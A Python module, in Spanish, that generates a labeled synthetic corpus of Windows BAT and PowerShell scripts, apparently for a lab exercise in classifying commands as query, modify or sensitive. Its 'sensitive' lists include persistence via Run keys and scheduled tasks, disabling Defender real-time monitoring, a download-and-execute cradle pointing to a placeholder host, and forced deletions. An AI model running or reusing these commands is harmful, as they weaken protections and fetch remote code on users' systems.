"""Corpus sintético de laboratorio (los scripts son TEXTO; nunca se ejecutan).

- Parte BAT: reproduce exactamente generar_corpus.py del proyecto original
  (guía 03B, §11.1): semilla 2026, 30 scripts por clase.
- Parte PowerShell (ampliación): mismo diseño con comandos equivalentes de
  PowerShell, semilla 2027, 30 scripts por clase.
Total: 180 scripts (60 por clase).
"""

from __future__ import annotations

import random

CONSULTA = ["ver", "systeminfo", "tasklist", "ipconfig /all", "getmac /v", "netstat -ano", "whoami",
            "echo %USERNAME% %COMPUTERNAME%", "reg query \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\"",
            "powershell -NoProfile -Command \"Get-Process | Sort-Object WorkingSet64 -Descending | Select-Object -First 5\"",
            "echo Fecha: %DATE% Hora: %TIME%", "timeout /t 5 >nul"]
MODIFICA = ["mkdir \"C:\\Parcial\"", "copy /Y reporte.txt \"%TEMP%\\Parcial\\\"", "systeminfo >> \"C:\\Parcial\\reporte.txt\"",
            "reg add \"HKCU\\Software\\LabSO\" /v Nota /t REG_SZ /d prueba /f", "xcopy C:\\Parcial D:\\Respaldo /E /I /Y",
            "echo Reporte > \"C:\\Parcial\\r.txt\"", "powershell -NoProfile -Command \"New-Item -ItemType Directory C:\\Lab\""]
SENSIBLE = ["reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v Demo /d \"C:\\Lab\\demo.bat\" /f",
            "schtasks /create /tn Demo /tr C:\\Lab\\demo.bat /sc minute /mo 5", "attrib +h +s \"C:\\Lab\\demo.bat\"",
            "rmdir /s /q \"C:\\Lab\\Temporal\"", "wscript \"C:\\Lab\\oculto.vbs\"", "taskkill /f /im notepad.exe",
            "ftp -s:\"C:\\Lab\\comandos.txt\"", "net user invitado2 Clave123 /add",
            "powershell -WindowStyle Hidden -Command \"Start-Sleep 1\"", "del /f /q \"C:\\Lab\\*.log\""]

PS_CONSULTA = ["Get-ComputerInfo | Select-Object OsName, OsVersion", "Get-Process | Sort-Object CPU -Descending | Select-Object -First 5",
               "Get-NetIPConfiguration", "Get-NetTCPConnection -State Established", "whoami", "Get-Service | Where-Object Status -eq Running",
               "Get-ItemProperty 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run'", "Get-Date", "Get-Volume",
               "Get-CimInstance Win32_OperatingSystem | Select-Object Caption", "Write-Host \"Usuario: $env:USERNAME\"", "Start-Sleep -Seconds 2"]
PS_MODIFICA = ["New-Item -ItemType Directory -Path C:\\Lab -Force", "Copy-Item .\\reporte.txt C:\\Lab\\ -Force",
               "Get-Process | Out-File C:\\Lab\\procesos.txt", "Set-ItemProperty -Path 'HKCU:\\Software\\LabSO' -Name Nota -Value prueba",
               "Get-Service | Export-Csv C:\\Lab\\servicios.csv -NoTypeInformation", "Add-Content -Path C:\\Lab\\log.txt -Value 'inicio'",
               "Rename-Item C:\\Lab\\a.txt b.txt"]
PS_SENSIBLE = ["Set-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' -Name Demo -Value 'C:\\Lab\\demo.ps1'",
               "Register-ScheduledTask -TaskName Demo -Action (New-ScheduledTaskAction -Execute 'C:\\Lab\\demo.bat') -Trigger (New-ScheduledTaskTrigger -AtLogOn)",
               "Remove-Item -Path C:\\Lab\\Temporal -Recurse -Force", "Stop-Process -Name notepad -Force",
               "Invoke-WebRequest -Uri https://ejemplo.invalid/archivo.zip -OutFile C:\\Lab\\a.zip",
               "Start-Process powershell -WindowStyle Hidden -ArgumentList '-NoProfile'", "Invoke-Expression $codigo",
               "(New-Object Net.WebClient).DownloadString('https://ejemplo.invalid/s.ps1')",
               "Set-MpPreference -DisableRealtimeMonitoring $true", "New-LocalUser -Name invitado2 -NoPassword; net user invitado2 /add"]


def _script_bat(rng: random.Random, etiqueta: str) -> str:
    cuerpo = rng.sample(CONSULTA, rng.randint(2, 6))
    if etiqueta in ("modifica", "sensible"):
        cuerpo += rng.sample(MODIFICA, rng.randint(1, 3))
    if etiqueta == "sensible":
        cuerpo += rng.sample(SENSIBLE, rng.randint(1, 2))
    rng.shuffle(cuerpo)
    if rng.random() < 0.4:
        cuerpo = [":INICIO"] + cuerpo + ["timeout /t 10 >nul", "goto INICIO"]
    return "\n".join(["@echo off", "rem script sintetico de laboratorio"] + cuerpo)


def _script_ps(rng: random.Random, etiqueta: str) -> str:
    cuerpo = rng.sample(PS_CONSULTA, rng.randint(2, 6))
    if etiqueta in ("modifica", "sensible"):
        cuerpo += rng.sample(PS_MODIFICA, rng.randint(1, 3))
    if etiqueta == "sensible":
        cuerpo += rng.sample(PS_SENSIBLE, rng.randint(1, 2))
    rng.shuffle(cuerpo)
    if rng.random() < 0.4:
        cuerpo = ["while ($true) {"] + ["    " + c for c in cuerpo] + ["    Start-Sleep -Seconds 10", "}"]
    return "\n".join(["# script sintetico de laboratorio", "$ErrorActionPreference = 'Stop'"] + cuerpo)


def generar() -> list[dict]:
    """Corpus determinista: misma salida en cada ejecución."""
    filas = []
    rng = random.Random(2026)  # semilla del original
    for etiqueta in ("consulta", "modifica", "sensible"):
        for i in range(30):
            filas.append({"archivo": f"{etiqueta}_{i:02d}.bat.txt", "etiqueta": etiqueta, "origen": "sintetico_bat", "texto": _script_bat(rng, etiqueta)})
    rng_ps = random.Random(2027)
    for etiqueta in ("consulta", "modifica", "sensible"):
        for i in range(30):
            filas.append({"archivo": f"{etiqueta}_{i:02d}.ps1.txt", "etiqueta": etiqueta, "origen": "sintetico_ps", "texto": _script_ps(rng_ps, etiqueta)})
    return filas
